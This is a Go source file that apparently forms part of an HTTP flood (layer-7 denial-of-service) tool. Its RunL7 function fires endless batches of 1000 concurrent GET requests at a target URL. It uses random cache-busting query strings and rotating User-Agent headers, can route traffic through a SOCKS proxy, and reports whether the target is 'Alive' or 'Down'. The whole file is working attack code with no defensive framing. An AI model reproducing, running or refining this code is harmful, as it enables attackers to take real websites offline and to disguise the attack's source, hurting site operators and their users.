package engine

import (
	"fmt"
	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
	"math/rand"
	"sync"
	"time"
)

func RunL7(target string, proxy string, stop chan bool) {
	client := &fasthttp.Client{
		MaxConnsPerHost: 5000,
		ReadTimeout:     1 * time.Second,
		WriteTimeout:    1 * time.Second,
	}

	if proxy != "" {
		client.Dial = fasthttpproxy.FasthttpSocksDialer(proxy)
	}

	for {
		select {
		case <-stop:
			return
		default:
			var wg sync.WaitGroup
			var mu sync.Mutex
			successCount := 0
			sampleStatus := 0
			var sampleErr error

			for i := 0; i < 1000; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					req := fasthttp.AcquireRequest()
					resp := fasthttp.AcquireResponse()
					defer fasthttp.ReleaseRequest(req)
					defer fasthttp.ReleaseResponse(resp)

					req.SetRequestURI(fmt.Sprintf("%s?cache=%d", target, rand.Int()))
					req.Header.SetMethod("GET")
					req.Header.Set("User-Agent", GetRandomUA())
					req.Header.Set("Connection", "keep-alive")

					err := client.Do(req, resp)

					mu.Lock()
					if err == nil {
						successCount++
						sampleStatus = resp.StatusCode()
					} else {
						sampleErr = err
					}
					mu.Unlock()
				}()
			}
			wg.Wait()

			if successCount > 0 {
				fmt.Printf("[+] Target Alive %s | Status: %d | Success: %d/1000\n", target, sampleStatus, successCount)
			} else {
				fmt.Printf("[!] Target Down %s | Last Error: %v\n", target, sampleErr)
			}
		}
	}
}